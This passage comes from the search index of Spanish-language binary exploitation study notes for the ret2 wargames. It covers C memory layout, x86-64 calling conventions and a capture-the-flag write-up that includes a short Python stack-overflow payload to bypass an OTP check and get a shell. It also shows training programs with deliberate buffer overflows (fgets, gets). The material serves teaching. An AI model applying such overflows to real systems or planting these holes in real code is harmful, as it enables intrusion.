<code>strcpy</code>.</p>"},{"location":"bin-exploitation/ret2war-notes/level-1/memory-intro/#ejemplo_1","title":"Ejemplo","text":"<pre><code>// Copia una cadena est\u00e1tica en el buffer\nstrcpy(buffer, \"Hello World!\");\n</code></pre>"},{"location":"bin-exploitation/ret2war-notes/level-1/memory-intro/#visualizacion-del-buffer-llenado","title":"Visualizaci\u00f3n del Buffer Llenado","text":"<pre><code>------------------------------------------------------------\n-- Visualizaci\u00f3n de Buffer #2\n------------------------------------------------------------\n\n                . . . . . . . . . . . . . . . . . . . . . .\n\n                +------------------ 0x7fffffffed80 -----------------+\n                | B0 | ED | FF | FF | FF | 7F | 00 | 00 |\n                +---------------------------------------+\n                | 36 | 30 | 40 | 00 | 00 | 00 | 00 | 00 |\n                +------------------ 0x7fffffffed90 -----------------+\n buffer -----&gt;  | 48 | 65 | 6C | 6C | 6F | 20 | 57 | 6F |  &lt;- \"Hello Wo\"\n                +---------------------------------------+\n                | 72 | 6C | 64 | 21 | 00 | 00 | 00 | 00 |  &lt;- \"rld!\\0\"\n                +---------------------------------------+\n                | B0 | ED | FF | FF | FF | 7F | 00 | 00 |\n                +------------------ 0x7fffffffeda8 -----------------+\n\n                . . . . . . . . . . . . . . . . . . . . . .\n</code></pre>"},{"location":"bin-exploitation/ret2war-notes/level-1/memory-intro/#datos-arbitrarios","title":"Datos Arbitrarios","text":"<p>Los buffers pueden almacenar entradas de usuario mediante funciones como <code>fgets</code>.</p>"},{"location":"bin-exploitation/ret2war-notes/level-1/memory-intro/#ejemplo_2","title":"Ejemplo","text":"<pre><code>// Llena el buffer con entrada del usuario\nprintf(\"Enter data: \");\nfgets(buffer, sizeof(buffer), stdin);\n</code></pre>"},{"location":"bin-exploitation/ret2war-notes/level-1/memory-intro/#visualizacion-con-entrada-de-usuario-ejemplo-0x00001","title":"Visualizaci\u00f3n con Entrada de Usuario (Ejemplo: <code>0x00001</code>)","text":"<pre><code>------------------------------------------------------------\n-- Visualizaci\u00f3n de Buffer #3\n------------------------------------------------------------\n\n                . . . . . . . . . . . . . . . . . . . . . .\n\n                +------------------ 0x7fffffffed80 -----------------+\n                | B0 | ED | FF | FF | FF | 7F | 00 | 00 |\n                +---------------------------------------+\n                | 89 | 30 | 40 | 00 | 00 | 00 | 00 | 00 |\n                +------------------ 0x7fffffffed90 -----------------+\n buffer -----&gt;  | 30 | 78 | 30 | 30 | 30 | 30 | 31 | 0A |  &lt;- \"0x00001\\n\"\n                +---------------------------------------+\n                | 00 | 00 | 00 | 00 | 00 | 00 | 00 | 00 |\n                +---------------------------------------+\n                | B0 | ED | FF | FF | FF | 7F | 00 | 00 |\n                +------------------ 0x7fffffffeda8 -----------------+\n\n                . . . . . . . . . . . . . . . . . . . . . .\n</code></pre>"},{"location":"bin-exploitation/ret2war-notes/level-1/memory-intro/#punteros","title":"Punteros","text":"<p>Los punteros son direcciones de memoria que hacen referencia a variables o funciones. El operador unario <code>&amp;</code> se usa para obtener la direcci\u00f3n de memoria de una variable.</p>"},{"location":"bin-exploitation/ret2war-notes/level-1/memory-intro/#ejemplo_3","title":"Ejemplo","text":"<pre><code>printf(\"Misc Pointers:\\n\");\nprintf(\" -     int foobar  @ %p\\n\", &amp;foobar);\nprintf(\" - demo_pointers() @ %p\\n\", &amp;demo_pointers);\n</code></pre> <p>Los punteros son esenciales para explorar el funcionamiento interno de una aplicaci\u00f3n en tiempo de ejecuci\u00f3n.</p>"},{"location":"bin-exploitation/ret2war-notes/level-1/memory-intro/#paso-por-referencia","title":"Paso por Referencia","text":"<p>Un par\u00e1metro declarado como puntero (usando <code>*</code>) almacena una direcci\u00f3n de memoria. Los datos grandes, como buffers, se pasan por referencia para evitar copias costosas.</p>"},{"location":"bin-exploitation/ret2war-notes/level-1/memory-intro/#ejemplo_4","title":"Ejemplo","text":"<pre><code>void pass_buffers(char *buffer_small, ...);\n</code></pre>"},{"location":"bin-exploitation/ret2war-notes/level-1/memory-intro/#visualizacion-de-punteros","title":"Visualizaci\u00f3n de Punteros","text":"<pre><code>------------------------------------------------------------\n-- Visualizaci\u00f3n de Puntero\n------------------------------------------------------------\n\n  +---------------------+----------------+\n  | char *buffer_small  | 0x7fffffffeb20 |---+\n  +---------------------+----------------+   |\n                                            |\n           +--------------------------------+\n           |      . . . . . . . . . . . . . . . . . . . . . .\n           |      +------------------ 0x7fffffffeb10 -----------------+\n           |      | 01 | 00 | 00 | 00 | 00 | 00 | 00 | 00 |\n           |      +---------------------------------------+\n           |      | 68 | 71 | 22 | 00 | D2 | 04 | 00 | 00 |\n           +----&gt; +------------------ 0x7fffffffeb20 -----------------+\n                  | 41 | 41 | 41 | 41 | 41 | 41 | 41 | 41 |  &lt;- \"AAAAAAAA\"\n                  +---------------------------------------+\n                  | 41 | 41 | 41 | 41 | 41 | 41 | 41 | 41 |\n                  +---------------------------------------+\n                  | 41 | 41 | 41 | 41 | 41 | 41 | 41 | 41 |\n                  +------------------ 0x7fffffffeb40 -----------------+\n\n                  . . . . . . . . . . . . . . . . . . . . . .\n</code></pre>"},{"location":"bin-exploitation/ret2war-notes/level-1/memory-intro/#estructuras","title":"Estructuras","text":"<p>Una estructura (<code>struct</code>) es un tipo de dato complejo que agrupa varias variables (miembros) bajo un solo nombre. Es lo m\u00e1s cercano en C a un objeto de clase.</p>"},{"location":"bin-exploitation/ret2war-notes/level-1/memory-intro/#ejemplo_5","title":"Ejemplo","text":"<pre><code>typedef struct person {\n    char first_name[16];\n    char last_name[16];\n    uint32_t age;\n    uint32_t weight;\n} person;\n\n// Inicializa una estructura 'person' vac\u00eda\nperson student = {};\n\n// Llena los campos de la estructura\nstrcpy(student.first_name, \"Jane\");\nstrcpy(student.last_name, \"Doe\");\nstudent.age = 21;\nstudent.weight = 112;\n</code></pre>"},{"location":"bin-exploitation/ret2war-notes/level-1/memory-intro/#visualizacion-de-estructura","title":"Visualizaci\u00f3n de Estructura","text":"<pre><code>------------------------------------------------------------\n-- Visualizaci\u00f3n de Estructura\n------------------------------------------------------------\n\n                . . . . . . . . . . . . . . . . . . . . . .\n\n                +------------------ 0x7fffffffed70 -----------------+\n                | B0 | ED | FF | FF | FF | 7F | 00 | 00 |\n                +---------------------------------------+\n person -------&gt;| F7 | 32 | 40 | 00 | 00 | 00 | 00 | 00 |\n                +------------------ 0x7fffffffed80 -----------------+\n first_name --&gt; | 4A | 61 | 6E | 65 | 00 | 00 | 00 | 00 |  &lt;- \"Jane\\0\"\n                +---------------------------------------+\n                | 00 | 00 | 00 | 00 | 00 | 00 | 00 | 00 |\n                +---------------------------------------+\n last_name ---&gt; | 44 | 6F | 65 | 00 | 00 | 00 | 00 | 00 |  &lt;- \"Doe\\0\"\n                +---------------------------------------+\n                | 00 | 00 | 00 | 00 | 00 | 00 | 00 | 00 |\n                +---------------------------------------+\n age/weight --&gt; | 15 | 00 | 00 | 00 | 70 | 00 | 00 | 00 |  &lt;- 21, 112\n                +---------------------------------------+\n                | 00 | 52 | CE | FC | 95 | 09 | 2B | 73 |\n                +------------------ 0x7fffffffedb8 -----------------+\n\n                . . . . . . . . . . . . . . . . . . . . . .\n</code></pre>"},{"location":"bin-exploitation/ret2war-notes/level-1/memory-intro/#punteros-a-estructuras","title":"Punteros a Estructuras","text":"<p>Las estructuras suelen pasarse a funciones como punteros para mayor eficiencia. Para acceder o modificar los miembros de una estructura a trav\u00e9s de un puntero, se usa el operador <code>-&gt;</code>.</p>"},{"location":"bin-exploitation/ret2war-notes/level-1/memory-intro/#ejemplo_6","title":"Ejemplo","text":"<pre><code>void pass_structure(person *student) {\n    // Modifica la estructura mediante puntero\n    strcpy(student-&gt;first_name, \"John\");\n    strcpy(student-&gt;last_name, \"Smith\");\n    student-&gt;age = 18;\n    student-&gt;weight = 173;\n}\n</code></pre>"},{"location":"bin-exploitation/ret2war-notes/level-1/memory-intro/#datos-globales","title":"Datos Globales","text":"<p>Las variables globales son accesibles desde cualquier funci\u00f3n en el programa y suelen definirse con el prefijo <code>g_</code> para indicar su naturaleza global.</p>"},{"location":"bin-exploitation/ret2war-notes/level-1/memory-intro/#ejemplo_7","title":"Ejemplo","text":"<pre><code>const uint8_t g_encrypted[16] = {\n    0xA1, 0xAD, 0xBF, 0xB8, 0xA9, 0xBE, 0x93, 0xBC,\n    0xAD, 0xBF, 0xBF, 0xBB, 0xA3, 0xBE, 0xA8, 0xCC\n};\n</code></pre> <p>Estas variables se almacenan en la secci\u00f3n de datos del binario, un tema que se explorar\u00e1 en lecciones futuras. En este caso, la funci\u00f3n <code>validate_password()</code> usa <code>g_encrypted</code> para autenticar contrase\u00f1as.</p>"},{"location":"bin-exploitation/ret2war-notes/level-1/memory-intro/#ejemplo-de-decodificacion-python","title":"Ejemplo de Decodificaci\u00f3n (Python)","text":"<pre><code>g_encrypted = [0xA1, 0xAD, 0xBF, 0xB8, 0xA9, 0xBE, 0x93, 0xBC,\n               0xAD, 0xBF, 0xBF, 0xBB, 0xA3, 0xBE, 0xA8, 0xCC]\npassword = ''.join(chr(b ^ 0xCC) for b in g_encrypted)\nprint(password)\n</code></pre>"},{"location":"bin-exploitation/ret2war-notes/level-3/calling-conventions/","title":"Convenciones de llamada","text":"<p>En este punto, hemos visto c\u00f3mo funcionan las funciones, pero hemos omitido algunos detalles para simplificar. En este nivel, cubriremos la convenci\u00f3n de llamadas utilizada en sistemas Linux x86-64. Esto completar\u00e1 los conceptos aprendidos hasta ahora y te ayudar\u00e1 a construir una intuici\u00f3n sobre c\u00f3mo el c\u00f3digo en C de alto nivel se traduce a ensamblador.</p>"},{"location":"bin-exploitation/ret2war-notes/level-3/calling-conventions/#objetivos-de-aprendizaje","title":"Objetivos de Aprendizaje","text":"<ul> <li>Comprender c\u00f3mo se implementa el paso de argumentos a funciones.</li> <li>Identificar argumentos de funciones en c\u00f3digo ensamblador.</li> </ul> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\nvoid funcion_cadenas(char * a1, char * a2, char * a3, char * a4) \n{\n    printf(\" Arg 1: %s\\n\", a1);\n    printf(\" Arg 2: %s\\n\", a2);\n    printf(\" Arg 3: %s\\n\", a3);\n    printf(\" Arg 4: %s\\n\", a4);\n}\n\nvoid funcion_mixta(char * a1, int a2, short a3, char a4) \n{\n    printf(\" Arg 1: %s\\n\",  a1);\n    printf(\" Arg 2: %d\\n\",  a2);\n    printf(\" Arg 3: %hd\\n\", a3);\n    printf(\" Arg 4: %c\\n\",  a4);\n}\n\nvoid funcion_enteros(int a1, unsigned int a2) \n{\n    printf(\" Arg 1: %d\\n\", a1);\n    printf(\" Arg 2: %u\\n\", a2);\n}\n\nvoid funcion_muchos_args(char * a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8) \n{\n    printf(\" Arg 1: %s\\n\", a1);\n    printf(\" Arg 2: %d\\n\", a2);\n    printf(\" Arg 3: %d\\n\", a3);\n    printf(\" Arg 4: %d\\n\", a4);\n    printf(\" Arg 5: %d\\n\", a5);\n    printf(\" Arg 6: %d\\n\", a6);\n    printf(\" Arg 7: %d\\n\", a7);\n    printf(\" Arg 8: %d\\n\", a8);\n}\n\nint main()\n{\n    unsigned int opcion = 0;\n\n    while (1)\n    {\n        printf(\"-- Men\u00fa de Convenciones de Llamadas --\\n\"\n               \" 1. Argumentos de Cadenas            \\n\"\n               \" 2. Argumentos Mixtos                \\n\"\n               \" 3. Argumentos Enteros               \\n\"\n               \" 4. Muchos Argumentos                \\n\"\n               \" 5. Salir                            \\n\"\n               \"-------------------------------------\\n\"\n               \"Ingrese una opci\u00f3n: \");\n        if (scanf(\"%u\", &amp;opcion) == EOF)\n            break;\n\n        if (opcion == 1)\n            funcion_cadenas(\"uno\", \"dos\", \"tres\", \"cuatro\");\n        else if (opcion == 2)\n            funcion_mixta(\"uno\", 1337, 123, 'A');\n        else if (opcion == 3)\n            funcion_enteros(0x12345678, 0x87654321);\n        else if (opcion == 4)\n            funcion_muchos_args(\"uno\", 1, 2, 3, 4, 5, 6, 7);\n        else if (opcion == 5)\n            break;\n        else\n            printf(\"\u00a1Opci\u00f3n inv\u00e1lida!\\n\");\n\n        opcion = 0;\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"bin-exploitation/ret2war-notes/level-3/calling-conventions/#argumentos-de-funcion","title":"Argumentos de Funci\u00f3n","text":"<p>Hemos visto detalles sobre c\u00f3mo se realizan las llamadas a funciones en x86 y c\u00f3mo se manejan los argumentos. Ahora exploraremos c\u00f3mo se gestionan los argumentos en sistemas Linux x86-64.</p> <p>Para comenzar, establece un punto de interrupci\u00f3n en <code>funcion_cadenas(...)</code> y ejecuta el programa.</p> <pre><code>wdb&gt; break funcion_cadenas\nwdb&gt; run\n</code></pre>"},{"location":"bin-exploitation/ret2war-notes/level-3/calling-conventions/#convenciones-de-llamadas","title":"Convenciones de Llamadas","text":"<p>El esquema que utiliza un sistema operativo para pasar argumentos a funciones y recibir resultados se llama convenci\u00f3n de llamadas. Estas convenciones var\u00edan seg\u00fan el sistema operativo y la arquitectura.</p> <p>En Linux x86-64, la convenci\u00f3n de llamadas es la siguiente:</p> <pre><code>1er argumento: rdi\n2do argumento: rsi\n3er argumento: rdx\n4to argumento: rcx\n5to argumento: r8\n6to argumento: r9\n\nResultado: rax\n</code></pre> <p>Los argumentos adicionales se colocan en la pila.</p> <p>Prueba imprimir algunos de los argumentos y contin\u00faa la ejecuci\u00f3n.</p> <pre><code>wdb&gt; x/s $rdi\nwdb&gt; x/s $rsi\n...\n</code></pre> <p>Deber\u00edas ver la salida impresa coincidiendo con tu inspecci\u00f3n manual de registros. Si no, vuelve al primer punto de interrupci\u00f3n e int\u00e9ntalo de nuevo.</p>"},{"location":"bin-exploitation/ret2war-notes/level-3/calling-conventions/#argumentos-en-la-pila","title":"Argumentos en la Pila","text":"<p>Cuando se agotan los registros disponibles, los argumentos adicionales se colocan en la pila. Intenta inspeccionar la memoria de la pila para encontrar estos argumentos:</p> <pre><code>wdb&gt; x/10gd $rsp\n</code></pre>"},{"location":"bin-exploitation/ret2war-notes/level-3/calling-conventions/#referencia-de-argumentos-en-la-pila","title":"Referencia de Argumentos en la Pila","text":"<p>Los argumentos en la pila suelen referenciarse con un \u00edndice positivo desde <code>$rbp</code>. Por ejemplo:</p> <pre><code>mov     eax, dword [rbp+0x18]\n</code></pre> <p>Esto indica que el argumento est\u00e1 basado en la pila. El marco de pila t\u00edpico se ve as\u00ed:</p> <pre><code>&lt;argumentos en la pila&gt; | ($rbp + 8) + ?\n&lt;direcci\u00f3n de retorno&gt;  | $rbp + 8\n&lt;puntero base guardado&gt; | $rbp apunta aqu\u00ed\n&lt;variables locales&gt;     | ($rbp - 8) - ?\n</code></pre> <p>Con esto, hemos cubierto los conceptos esenciales de la convenci\u00f3n de llamadas en Linux x86-64.</p>"},{"location":"bin-exploitation/ret2war-notes/level-3/challenge1/","title":"Secure Logon - Memory corruption challenge no 1","text":""},{"location":"bin-exploitation/ret2war-notes/level-3/challenge1/#introduccion","title":"Introducci\u00f3n","text":"<p>El challenge \"Secure Logon\" del nivel 1 en wargames.ret2.systems consiste en bypassar un mecanismo de autenticaci\u00f3n basado en una contrase\u00f1a de un solo uso (OTP). El programa genera una OTP aleatoria y compara la entrada del usuario con esta OTP. Si coinciden, se autentica al usuario y se ejecuta una shell (<code>/bin/sh</code>). Aunque parece seguro, una vulnerabilidad en el manejo de la entrada permite sobrescribir la OTP, logrando la autenticaci\u00f3n sin conocerla.</p> <p>En este documento, analizaremos el c\u00f3digo, identificaremos la vulnerabilidad, explicaremos c\u00f3mo calcular el offset para el desbordamiento, detallaremos la estrategia de explotaci\u00f3n y desglosaremos el exploit en Python.</p>"},{"location":"bin-exploitation/ret2war-notes/level-3/challenge1/#analisis-del-codigo-fuente","title":"An\u00e1lisis del C\u00f3digo Fuente","text":"<p>El c\u00f3digo fuente en C es el siguiente:</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdint.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;inttypes.h&gt;\n#include &lt;unistd.h&gt;\n#include \"wargames.h\"\n\nvoid generate_otp(char * buffer, int len) \n{\n    FILE *fp = fopen(\"/dev/urandom\", \"r\");\n    int bytes_read = fread(buffer, 1, len, fp);\n    fclose(fp);\n    if (bytes_read != len)\n        exit(1);\n    for (int i = 0; i &lt; len; i++)\n        buffer[i] = 0x41 + ((unsigned char)buffer[i] % 26);\n    buffer[len-1] = 0;\n}\n\nvoid main()\n{\n    init_wargame();\n    printf(\"------------------------------------------------------------\\n\");\n    printf(\"--[ Stack Smashing Level #1 - Secure Logon                  \\n\");\n    printf(\"------------------------------------------------------------\\n\");\n\n    char user_password[32] = {};\n    char otp_password[32] = {};\n    generate_otp(otp_password, sizeof(otp_password));\n    printf(\"Enter password: \");\n    fgets(user_password, 0x32, stdin);\n    user_password[strcspn(user_password, \"\\n\")] = 0;\n    if (strlen(user_password) == 0) \n    {\n        puts(\"Invalid input...\");\n        exit(1);\n    }\n    if (!strcmp(user_password, otp_password))\n    {\n        puts(\"Authenticated!\");\n        system(\"/bin/sh\");\n    }\n    else \n    {\n        puts(\"Authentication failed...\");\n    }\n}\n</code></pre>"},{"location":"bin-exploitation/ret2war-notes/level-3/challenge1/#puntos-clave-del-codigo","title":"Puntos Clave del C\u00f3digo","text":"<ol> <li>Funci\u00f3n <code>generate_otp</code>:</li> <li>Lee 32 bytes aleatorios de <code>/dev/urandom</code> en <code>otp_password</code>.</li> <li>Convierte cada byte en una letra may\u00fascula (A-Z) usando: <code>buffer[i] = 0x41 + ((unsigned char)buffer[i] % 26)</code>.</li> <li> <p>Coloca un byte nulo (<code>\\0</code>) en <code>buffer[31]</code> para terminar la cadena.</p> </li> <li> <p>Funci\u00f3n <code>main</code>:</p> </li> <li>Declara dos buffers en la pila: <code>user_password</code> (32 bytes) y <code>otp_password</code> (32 bytes), probablemente contiguos.</li> <li>Genera una OTP en <code>otp_password</code>.</li> <li>Usa <code>fgets(user_password, 0x32, stdin)</code> para leer hasta 50 bytes.</li> <li>Elimina el salto de l\u00ednea (<code>\\n</code>) y verifica que <code>user_password</code> no est\u00e9 vac\u00edo.</li> <li>Compara <code>user_password</code> con <code>otp_password</code> con <code>strcmp</code>. Si son iguales, ejecuta <code>/bin/sh</code>.</li> </ol>"},{"location":"bin-exploitation/ret2war-notes/level-3/challenge1/#identificacion-de-la-vulnerabilidad","title":"Identificaci\u00f3n de la Vulnerabilidad","text":"<p>La vulnerabilidad est\u00e1 en <code>fgets(user_password, 0x32, stdin)</code>: - <code>user_password</code> tiene 32 bytes. - <code>fgets</code> permite leer hasta 50 bytes (<code>0x32</code> en hexadecimal). - Esto permite un desbordamiento de buffer, ya que se pueden escribir m\u00e1s bytes de los que <code>user_password</code> puede contener, sobrescribiendo <code>otp_password</code>, que probablemente est\u00e1 justo despu\u00e9s en la pila.</p>"},{"location":"bin-exploitation/ret2war-notes/level-3/challenge1/#calculo-del-offset-para-el-desbordamiento","title":"C\u00e1lculo del Offset para el Desbordamiento","text":"<p>Para explotar el desbordamiento, necesitamos determinar cu\u00e1ntos bytes debemos escribir en <code>user_password</code> para empezar a sobrescribir <code>otp_password</code>. Esto se calcula analizando la disposici\u00f3n de la pila:</p>"},{"location":"bin-exploitation/ret2war-notes/level-3/challenge1/#disposicion-de-la-pila","title":"Disposici\u00f3n de la Pila","text":"<p>En C, las variables locales declaradas en una funci\u00f3n se almacenan en la pila. Aunque la pila como estructura de datos crece hacia direcciones de memoria m\u00e1s bajas, la forma en que el compilador organiza las variables dentro del marco de la pila (stack frame) puede variar.</p> <p>En arquitecturas comunes como x86-64, es frecuente que el compilador coloque las variables en el orden en que se declaran, desde direcciones m\u00e1s bajas hacia m\u00e1s altas.</p> <p>Con la declaraci\u00f3n <code>char user_password[32]; char otp_password[32];</code>, <code>user_password</code> se ubicar\u00eda en una direcci\u00f3n base (p. ej., <code>0x7fffffffed80</code>) y <code>otp_password</code> se colocar\u00eda inmediatamente despu\u00e9s, en una direcci\u00f3n m\u00e1s alta (<code>0x7fffffffed80 + 32 = 0x7fffffffeda0</code>).</p> <p>Nota importante: Este comportamiento no est\u00e1 garantizado por el est\u00e1ndar de C y depende del compilador y la arquitectura. Por eso, usar un depurador es el m\u00e9todo definitivo para confirmar la disposici\u00f3n.</p>"},{"location":"bin-exploitation/ret2war-notes/level-3/challenge1/#tamano-del-buffer","title":"Tama\u00f1o del Buffer","text":"<ul> <li><code>user_password</code> tiene 32 bytes de capacidad.</li> <li>Para sobrescribir el primer byte de <code>otp_password</code>, debemos escribir exactamente 32 bytes para llenar por completo <code>user_password</code> y luego continuar escribiendo en la memoria adyacente.</li> </ul>"},{"location":"bin-exploitation/ret2war-notes/level-3/challenge1/#confirmacion-del-offset","title":"Confirmaci\u00f3n del Offset","text":"<p>Podemos verificar el offset usando un depurador como <code>gdb</code>. Inspeccionando las direcciones de las variables:</p> <pre><code>p &amp;user_password\np &amp;otp_password\n</code></pre> <p>Si la direcci\u00f3n de <code>otp_password</code> es exactamente 32 bytes mayor que la de <code>user_password</code>, hemos confirmado nuestro offset. Tambi\u00e9n podemos usar un patr\u00f3n de entrada (como <code>AAA...</code>) y observar en el depurador c\u00f3mo se sobrescribe <code>otp_password</code>.</p>"},{"location":"bin-exploitation/ret2war-notes/level-3/challenge1/#offset-final","title":"Offset Final","text":"<ul> <li>Para empezar a escribir sobre <code>otp_password</code>, el offset es de 32 bytes.</li> <li>Para sobrescribir los primeros <code>N</code> bytes de <code>otp_password</code>, necesitamos escribir un total de 32 + N bytes.</li> <li>Siendo N el n\u00famero de bytes que queremos escribir en <code>otp_password</code>, en este caso, 2 bytes para escribir <code>'A\\x00'</code>.</li> </ul>"},{"location":"bin-exploitation/ret2war-notes/level-3/challenge1/#estrategia-de-explotacion","title":"Estrategia de Explotaci\u00f3n","text":"<p>El objetivo es hacer que <code>user_password</code> y <code>otp_password</code> contengan la misma cadena (<code>\"A\"</code>) para que <code>strcmp</code> devuelva 0. La estrategia es: 1. Escribir una cadena corta terminada en nulo (<code>A\\x00</code>) en <code>user_password</code> para pasar el chequeo de <code>strlen</code>. 2. Usar 30 bytes de relleno para llegar al borde de <code>user_password</code>. 3. Sobrescribir el inicio de <code>otp_password</code> con la misma cadena (<code>A\\x00</code>). 4. Terminar con un salto de l\u00ednea (<code>\\n</code>) para que <code>fgets</code> complete la lectura.</p>"},{"location":"bin-exploitation/ret2war-notes/level-3/challenge1/#el-exploit-en-python","title":"El Exploit en Python","text":"<p>El siguiente script en Python automatiza la explotaci\u00f3n:</p> <pre><code>import interact\nimport struct\n\ndef p64(n):\n    return struct.pack('Q', n)\n\ndef u64(s):\n    return struct.unpack('Q', s)[0]\n\np = interact.Process()\np.readuntil('Enter password: ')\n\npayload = b'A\\x00' + b'A'*30 + b'A\\x00' + b'\\n'\np.sendline(payload)\np.interactive()\n</code></pre>"},{"location":"bin-exploitation/ret2war-notes/level-3/challenge1/#explicacion-del-payload","title":"Explicaci\u00f3n del Payload","text":"<p>El payload <code>b'A\\x00' + b'A'*30 + b'A\\x00' + b'\\n'</code> (34 bytes) manipula la memoria:</p> <ol> <li><code>b'A\\x00'</code> (Bytes 0-1):</li> <li>Escribe <code>'A'</code> (0x41) y un byte nulo (<code>\\0</code>) en el inicio de <code>user_password</code>.</li> <li>El byte nulo termina la cadena, haciendo que <code>user_password</code> sea <code>\"A\"</code>.</li> <li> <p><code>strlen(user_password)</code> devuelve 1, pasando el chequeo.</p> </li> <li> <p><code>b'A'*30</code> (Bytes 2-31):</p> </li> <li>Relleno de 30 bytes con <code>'A'</code> para llenar <code>user_password</code> (32 bytes en total).</li> <li> <p>Esto posiciona el siguiente dato en el inicio de <code>otp_password</code>.</p> </li> <li> <p><code>b'A\\x00'</code> (Bytes 32-33):</p> </li> <li>Sobrescribe el inicio de <code>otp_password</code> con <code>'A'</code> y un byte nulo.</li> <li> <p>Hace que <code>otp_password</code> sea <code>\"A\"</code>.</p> </li> <li> <p><code>b'\\n'</code> (Byte 34):</p> </li> <li>Un salto de l\u00ednea asegura que <code>fgets</code> termine de leer.</li> </ol> <p>Total: 34 bytes, dentro del l\u00edmite de 50 bytes de <code>fgets</code>.</p>"},{"location":"bin-exploitation/ret2war-notes/level-3/challenge1/#desglose-del-payload-en-memoria","title":"Desglose del Payload en Memoria","text":"\u00cdndice (Byte #) B\u00fafer Valor (Byte) Valor (Hex) Prop\u00f3sito / Interpretaci\u00f3n 0 <code>user_password</code> <code>'A'</code> <code>0x41</code> Inicio de <code>user_password</code>. 1 <code>user_password</code> <code>'\\x00'</code> <code>0x00</code> Termina <code>user_password</code> como <code>\"A\"</code>. 2 a 31 <code>user_password</code> <code>'A'</code> (x30) <code>0x41</code> Relleno para llegar a <code>otp_password</code>. 32 <code>otp_password</code> <code>'A'</code> <code>0x41</code> Inicio de <code>otp_password</code>. 33 <code>otp_password</code> <code>'\\x00'</code> <code>0x00</code> Termina <code>otp_password</code> como <code>\"A\"</code>. 34 <code>otp_password</code> <code>'\\n'</code> <code>0x0A</code> Fin de entrada para <code>fgets</code>."},{"location":"bin-exploitation/ret2war-notes/level-3/challenge1/#resultado-en-memoria","title":"Resultado en Memoria","text":"<ul> <li><code>user_password</code>: <code>\"A\"</code> (terminado por <code>\\0</code> en el byte 1).</li> <li><code>otp_password</code>: <code>\"A\"</code> (sobrescrito por <code>A\\x00</code> en los bytes 32-33).</li> <li><code>strcmp(user_password, otp_password)</code> compara <code>\"A\"</code> con <code>\"A\"</code>, autentica y ejecuta <code>/bin/sh</code>.</li> </ul>"},{"location":"bin-exploitation/ret2war-notes/level-3/challenge1/#depuracion-con-gdb","title":"Depuraci\u00f3n con GDB","text":"<p>Para verificar el offset y la disposici\u00f3n de la pila: 1. Ejecuta:    <pre><code>wargames-gdb -q 03_level_1\n</code></pre> 2. Coloca un breakpoint despu\u00e9s de <code>fgets</code>:    <pre><code>break *main+&lt;offset_donde_fgets_termina&gt;\n</code></pre> 3. Ejecuta con un patr\u00f3n de entrada (por ejemplo, <code>AAA...A</code> de 50 bytes). 4. Inspecciona los buffers:    <pre><code>x/64bx &amp;user_password\n</code></pre>    - Confirma que <code>otp_password</code> comienza justo despu\u00e9s de <code>user_password[31]</code>. 5. Verifica que el payload sobrescribe <code>otp_password</code> correctamente.</p>"},{"location":"bin-exploitation/ret2war-notes/level-3/challenge1/#completando-el-challenge","title":"Completando el Challenge","text":"<p>En la shell resultante, ejecuta: <pre><code>cat flag\n</code></pre> Esto mostrar\u00e1 la bandera, como <code>flag{0nly_n00bs_n33d_th3_real_p4ssw0rd_anyw4y}</code>.</p>"},{"location":"bin-exploitation/ret2war-notes/level-3/memory-corruption/","title":"Corrupci\u00f3n de Memoria","text":""},{"location":"bin-exploitation/ret2war-notes/level-3/memory-corruption/#introduccion-a-la-pila","title":"Introducci\u00f3n a la Pila","text":"<p>Los programas escritos en lenguajes de bajo nivel como C son susceptibles a errores que pueden provocar corrupci\u00f3n de memoria. Este fen\u00f3meno puede causar comportamientos inesperados o fallos en los programas, pero tambi\u00e9n constituye la base de muchas t\u00e9cnicas de explotaci\u00f3n binaria.</p> <p>En este cap\u00edtulo, exploraremos los fundamentos de la explotaci\u00f3n binaria cl\u00e1sica mediante el an\u00e1lisis de desbordamientos de b\u00fafer y corrupci\u00f3n de memoria en la pila. Este ser\u00e1 tu punto de partida para comprender c\u00f3mo se desarrollan exploits en este contexto.</p> <ul> <li>Estructura de la Pila</li> <li>Stack Based Memory Corruption</li> <li>Return</li> <li>Calling Conventions</li> </ul>"},{"location":"bin-exploitation/ret2war-notes/level-3/memory-corruption/#challenges","title":"Challenges","text":"<ol> <li>Secure Logon</li> </ol>"},{"location":"bin-exploitation/ret2war-notes/level-3/return/","title":"Return","text":""},{"location":"bin-exploitation/ret2war-notes/level-3/return/#la-direccion-de-retorno","title":"La Direcci\u00f3n de Retorno","text":"<p>En capitulos anteriores, mencionamos que la control flow metadata se almacena en la pila. La direcci\u00f3n de retorno es la pieza m\u00e1s interesante de metadata para nuestros prop\u00f3sitos, porque define directamente qu\u00e9 c\u00f3digo se ejecutar\u00e1 despu\u00e9s de que una funci\u00f3n en particular termine de ejecutarse.</p> <p>En este nivel, examinaremos la direcci\u00f3n de retorno con m\u00e1s detalle y combinaremos ese conocimiento con lo que aprendimos sobre la corrupci\u00f3n de memoria para tomar directamente el control de un binario.</p>"},{"location":"bin-exploitation/ret2war-notes/level-3/return/#codigo-fuente","title":"C\u00f3digo fuente","text":"<pre><code>// gcc -g -no-pie -fno-stack-protector -I ../includes -o return return.c\n#include &lt;stdio.h&gt;\n#include &lt;stdint.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;inttypes.h&gt;\n\n// Oculto por simplicidad\n#include \"wargames.h\"\n#include \"return.h\"\n\nvoid good()\n{\n    printf(\"Correct!\\n\");\n    system(\"/bin/sh\");\n    exit(1);\n}\n\nvoid main()\n{\n    init_wargame();\n\n    printf(\"------------------------------------------------------------\\n\");\n    printf(\"--[ Stack Smashing - Return Address                         \\n\");\n    printf(\"------------------------------------------------------------\\n\");\n\n    char buffer[32] = {};\n\n    // Leer entrada del usuario desde STDIN, en un buffer en la pila\n    printf(\"Enter data: \");\n    gets(buffer);\n\n    // Mostrar una visualizaci\u00f3n del marco de pila actual\n    visualize_stack((uint8_t *)&amp;buffer);\n\n    // Salir del programa / retornar desde main\n}\n</code></pre>"},{"location":"bin-exploitation/ret2war-notes/level-3/return/#corrupcion-del-flujo-de-control","title":"Corrupci\u00f3n del Flujo de Control","text":"<p>En el nivel anterior, aprendimos a controlar datos en la pila mediante 